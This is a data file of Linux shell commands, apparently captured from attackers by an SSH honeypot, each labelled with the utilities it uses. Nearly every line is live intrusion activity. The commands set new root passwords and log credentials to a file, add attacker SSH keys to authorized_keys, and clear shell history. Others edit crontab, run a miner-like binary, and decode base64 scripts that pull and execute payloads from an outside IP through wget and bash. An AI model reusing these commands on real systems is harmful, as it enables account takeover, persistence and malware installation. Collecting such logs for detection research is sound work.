message
" cat /proc/cpuinfo | grep name | wc -l,Used utilities:;cat grep wc<|endoftext|>"
"  grep  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTiGm9b44ZjkQoMkcGuVsC8SGW7a9aFODS6nb64WnMwBwKPja7k56LyBBdVRm+MeKecx6Q/qLn5J+ggJ6um/LoCjKJLrX2dFOjGdyR4ZjnVBwibgr8PLrPoo7bUkaR3DMjfhcmoRlFrj51aN6g0TYHejCmug3TRpg37djYKqJ539iGNcmj021ZlzDBrjfIxUY849O72GsMuytk8n3K6XFxHj8gHyOsB7NgyvE39x9/SoGq2gkQS6TFun6dhmsr+ORokfS2265RwbdEOfnwL2LnQNuhiePlOUHRqzpc0K2pu9TGo1vNRIGSymCatMUNgnNX3tfcuMP5e8f1xDVh7fx3  ~/.ssh/authorized_keys,Used utilities:;grep<|endoftext|>"
"  netstat -plnt,Used utilities:;netstat<|endoftext|>"
"  ss -tln,Used utilities:;ss<|endoftext|>"
" scp -t /dev/shm/pdrgo245dybnhe14bzkhtrec2p,Used utilities:;scp<|endoftext|>"
"  /dev/shm/pdrgo245dybnhe14bzkhtrec2p,Used utilities:;/dev/shm/pdrgo245dybnhe14bzkhtrec2p<|endoftext|>"
"  rm -f /dev/shm/pdrgo245dybnhe14bzkhtrec2p,Used utilities:;rm<|endoftext|>"
" scp -t /tmp/pdrgo245dybnhe14bzkhtrec2p,Used utilities:;scp<|endoftext|>"
"  /tmp/pdrgo245dybnhe14bzkhtrec2p,Used utilities:;/tmp/pdrgo245dybnhe14bzkhtrec2p<|endoftext|>"
"  rm -f /tmp/pdrgo245dybnhe14bzkhtrec2p,Used utilities:;rm<|endoftext|>"
" scp -t /tmp/knrm,Used utilities:;scp<|endoftext|>"
" scp -t /tmp/r,Used utilities:;scp<|endoftext|>"
"  /tmp/knrm,Used utilities:;/tmp/knrm<|endoftext|>"
"  $SHELL /tmp/r,Used utilities:;$SHELL<|endoftext|>"
"  rm -f /home/admin/.dhpcd,Used utilities:;rm<|endoftext|>"
" scp -t /home/admin/.dhpcd,Used utilities:;scp<|endoftext|>"
"  /home/admin/.dhpcd -o 127.0.0.1:4444 -B >/dev/null 2>/dev/null,Used utilities:;/home/admin/.dhpcd<|endoftext|>"
"  top -bn1,Used utilities:;top<|endoftext|>"
"  crontab -l,Used utilities:;crontab<|endoftext|>"
"  chattr -i /var/spool/cron/crontabs/root,Used utilities:;chattr<|endoftext|>"
"  crontab -,Used utilities:;crontab<|endoftext|>"
"  rm -f /tmp/r /tmp/knrm,Used utilities:;rm<|endoftext|>"
" echo -e  login15 nyQJPebJmEmUD nyQJPebJmEmUD |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  login15 nyQJPebJmEmUD nyQJPebJmEmUD n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin login15  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:vSCIwIR3xMPL |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root pia  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:QO6M3uLmdnpt |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root vcd  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:ypK1RJbO27Zn |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root ybj  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:5mS2tHdgiwBF |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root casting  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:xpQ2xfNujYmd |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root heed  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:QFlRyG4UAjCL |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root joho369369  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:RRamPlpTVcIq |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Mima!  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
"/ip cloud print,Used utilities:;/ip<|endoftext|>"
" echo  root:xC0D6Few1Twz |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root phdlytw  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:Kv0BHBuhfkOM |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root elissa  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:HzqZ9kyX2Jwr |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root enigma28  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:bTaHNjQt2RfD |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root never  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:qajjBSuejNQi |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root dycjm2  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:drKB2sg9tRSf |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root sunil  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:LCASfz1xTRck |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root gwidc  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:JZultiHVeCwQ |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root irfan  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  4nd1r3d!mikro n9NvWyUbcDFch n9NvWyUbcDFch |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  4nd1r3d!mikro n9NvWyUbcDFch n9NvWyUbcDFch n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin 4nd1r3d!mikro  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:qeojLSDUFV4l |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root kdw  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  vds nAcvsSQowyfHV nAcvsSQowyfHV |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  vds nAcvsSQowyfHV nAcvsSQowyfHV n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin vds  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:mgW6KwuETVEh |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Passw0rt12#  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" cat /proc/mounts|  RJVWI,Used utilities:;cat RJVWI<|endoftext|>"
" cd /dev/shm| cat .s || cp /bin/echo .s|  RJVWI,Used utilities:;cd cat  cp RJVWI<|endoftext|>"
" tftp| wget|  RJVWI,Used utilities:;tftp wget RJVWI<|endoftext|>"
"  RJVWI,Used utilities:;RJVWI<|endoftext|>"
" echo -e  hgytyuig77 npFU7KiX5kWPM npFU7KiX5kWPM |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  hgytyuig77 npFU7KiX5kWPM npFU7KiX5kWPM n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin hgytyuig77  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:1ycQIYxdkzNu |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root WAPIDC  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:XO4AfeqBzgOW |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root P@$$W00RD2017  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:74CGCTBWDZYW |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root laura  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" cd /var/tmp| echo  IyEvYmluL2Jhc2gKY2QgL3RtcApybSAtcmYgLlgxNS11bml4Cm1rZGlyIC5YMTUtdW5peApjZCAuWDE1LXVuaXgKcGtpbGwgLTkgY3JvbiA+IC5vdXQKd2dldCAtcSBodHRwOi8vNTQuMzcuNzAuMjQ5L2RvdGEyLnRhci5neiB8fCBjdXJsIC1PIC1mIGh0dHA6Ly81NC4zNy43MC4yNDkvZG90YTIudGFyLmd6CnNsZWVwIDdzICYmIHRhciB4ZiBkb3RhMi50YXIuZ3oKI3JtIC1yZiBkb3RhMi50YXIuZ3oKY2QgLnJzeW5jCmNobW9kIDc3NyAqCmNkIC90bXAvLlgxNS11bml4Ly5yc3luYy9hICYmIC4vY3JvbiB8fCAuL2FuYWNyb24KZXhpdCAw >.threatstackcloudsecops| base64 --decode .threatstackcloudsecops | bash,Used utilities:;cd echo base64 bash<|endoftext|>"
" echo -e  88888888 nBc57hX1FnUNB nBc57hX1FnUNB |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  88888888 nBc57hX1FnUNB nBc57hX1FnUNB n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin 88888888  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" cd /dev/shm| rm -rf rp*| wget -q 54.37.70.249/rp|,Used utilities:;cd rm wget <|endoftext|>"
" cd /dev/shm| rm -rf .satan*| wget -w 1 -T 10 -t 5 -q 54.37.70.249/.satan| chmod 777 .satan,Used utilities:;cd rm wget chmod<|endoftext|>"
" sudo -S <<<  UNCHANGED  /dev/shm/.satan && whoami,Used utilities:;sudo<|endoftext|>"
" sudo -S <<<  88888888  /dev/shm/.satan && whoami,Used utilities:;sudo<|endoftext|>"
" sleep 15s && rm -rf /dev/shm/.satan*| rm -rf /dev/shm/rp*| rm -rf /dev/shm/ps*| rm -rf ~/ps*|,Used utilities:;sleep rm rm rm <|endoftext|>"
" cd /tmp || /var/tmp || /dev/shm| echo  IyEvYmluL2Jhc2gKCmNkIC90bXAgfHwgL3Zhci90bXAgfHwgL2Rldi9zaG0KCnJtIC1yZiAudmFyY2FjaGUqCgplY2hvICJaWFpoYkNCMWJuQmhZMnNnZFQwK2NYdGZJa1pWV1NnaU1WQThSbDFET1RjdFV6dFNZRjBvSWoxU1BGZEZUamhTUEZzaVFFaEVQRlkxVWoxR1JVUTdWeWhkS1ZNa1ZDMUNXRkV1SXpST0xETThVU3RES0ZJdFVqeEFQVFpaVERrM0xWTW9JakZUWHprM0tWWTZOakZQUEVOTUtqczNSRUFwSnlGUFBFY3hRUzh5UEZRdEl5eEhMbEJKVFQ0eUlXQTRWaVZPT0RaRlV5OHlRRUlvVnlGUUtFSkVXeUpHVlZrb0pDRkJPU1pWVXk4eVFFSXdNaWhNS0VWQVFsOHFNMHdxT3pkRVFEQW1KVlU5SmtCZEtpSXBURHRXTFVFN0prRlBQRmN3UWlvelRDb2lSbFZaS0NJeFREbzJXVUU4VlYxTk9EZEFYUzFEVENvN04wUkFLU2N0VERrMk5WQXZNeXhiSWtCSlRUNHlZRVJmTzBaRlF6cFNZRjBvSmoxRlBTWlpTVGhXVEVncU0wd3FPemRFUUNrbVJWSTRWbGxCT3pZMFFDOHlJVWM1TnpGT09qWXRTeW9pUkZzaVJsVlpLQ0l4VWprMkpVdzdSaVZOT1RKZ1hTZ2lRVUE5TmxsQlh6czJORUFyTmlWQUtqTk1LaUpH,Used utilities:;cd  /var/tmp  /dev/shm echo<|endoftext|>"
" whoami,Used utilities:;whoami<|endoftext|>"
" echo  root:DvruNsvGgdbp |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root ab1234123b4  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" uname -a|unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH|history -n|export HISTFILE=/dev/null|export HISTSIZE=0|export HISTFILESIZE=0|cd|mkdir .ssh|cat .ssh/authorized_keys|grep -v 'heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >>.ssh/.auth_k|echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddOTyVPftA3ljorQitmh1pyuZDty9oTWF+J0cOtGBvRaQ7NvZCaDC2q6QR0iMOfq7zs+4bl8WO8UnaQcVVIBeEt3YPo8PXwVm5fR4wgoq9SZp29/2jFz0UmAOhiUyImh9/P7jFWqpv3gSxZ8neq+4pSCUfE24OGiFBpJGkAE+wMmJcBX0WjFfjedcbBs1FO/C+x8WY9bFkQ3NwwjVbh3c3mYy9zqdPhm6GI/heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >> .ssh/.auth_k|mv .ssh/.auth_k .ssh/authorized_keys|cd,Used utilities:;uname unset history export export export cd mkdir cat grep echo mv cd<|endoftext|>"
" echo -e  Password5 nBzU9lij9Qt9b nBzU9lij9Qt9b |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  Password5 nBzU9lij9Qt9b nBzU9lij9Qt9b n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin Password5  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:OHMIjtVceyr8 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 1008611  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  Founder123 nL8TDZxWxuUf5 nL8TDZxWxuUf5 |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  Founder123 nL8TDZxWxuUf5 nL8TDZxWxuUf5 n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin Founder123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:nfG0z13k0m9e |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root heartless  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:wmTzolUMFAbw |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 7Mima@  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:sVIbl0R2rKOz |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 1234rewqg  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:U8HQ8Zvmrv9f |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root zxcvbnm47815  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:AJf6119psHo2 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root lkz  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:wuOE4u0TU3fW |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root dreamway  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:3MVo1ln07i16 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root:n9BIW0fCuUun |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root zhangyulai987  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:QHtLhMYm644y |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root marianne  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:dIrDKtSknXPt |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root OpenSSH22  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  Abc nDL6YJNyIuWEi nDL6YJNyIuWEi |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  Abc nDL6YJNyIuWEi nDL6YJNyIuWEi n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin Abc  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:8WCtLJ0jMK6d |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root zxcv123123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  q1w2e3 njsg9Emvdwy0X njsg9Emvdwy0X |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  q1w2e3 njsg9Emvdwy0X njsg9Emvdwy0X n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin q1w2e3  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:uqLQmtJt8JzT |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:rBniWAy3k36t |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Elena  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:hzwiaYGPImUo |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root yok  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:yxf3yOLwF77c |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root password12  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:xB83I2xIW9nX |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root frond  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  0392a0 nXLmoL2BirInx nXLmoL2BirInx |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  0392a0 nXLmoL2BirInx nXLmoL2BirInx n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin 0392a0  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo -e  1q2w3e$R%TY nqt7pU6Hcv6mh nqt7pU6Hcv6mh |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  1q2w3e$R%TY nqt7pU6Hcv6mh nqt7pU6Hcv6mh n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin 1q2w3e$R%TY  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:wFBC3pNKr8Ml |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root willien  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:t4RVZBaIBsex |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root mcintosh  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:2zW0yCkrLKWr |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root hzdns2008  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:x1JeO3o43OJ0 |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root 120469  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:IbFfT1SUzPBq |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root u7y6t5r4e3  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" cat /proc/mounts|  MCHLW,Used utilities:;cat MCHLW<|endoftext|>"
" cd /dev/shm| cat .s || cp /bin/echo .s|  MCHLW,Used utilities:;cd cat  cp MCHLW<|endoftext|>"
" tftp| wget|  MCHLW,Used utilities:;tftp wget MCHLW<|endoftext|>"
"  MCHLW,Used utilities:;MCHLW<|endoftext|>"
" echo -e  linux123 n7ncynD6FpH5H n7ncynD6FpH5H |passwd|bash,Used utilities:;echo passwd bash<|endoftext|>"
" echo  linux123 n7ncynD6FpH5H n7ncynD6FpH5H n |passwd,Used utilities:;echo passwd<|endoftext|>"
" echo  admin linux123  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:tORiIXOP59Tl |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root idcserver2007  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
" echo  root:tWHqIqXyP6Ui |chpasswd|bash,Used utilities:;echo chpasswd bash<|endoftext|>"
" echo  root Zaq!Xsw@  > /tmp/up.txt,Used utilities:;echo<|endoftext|>"
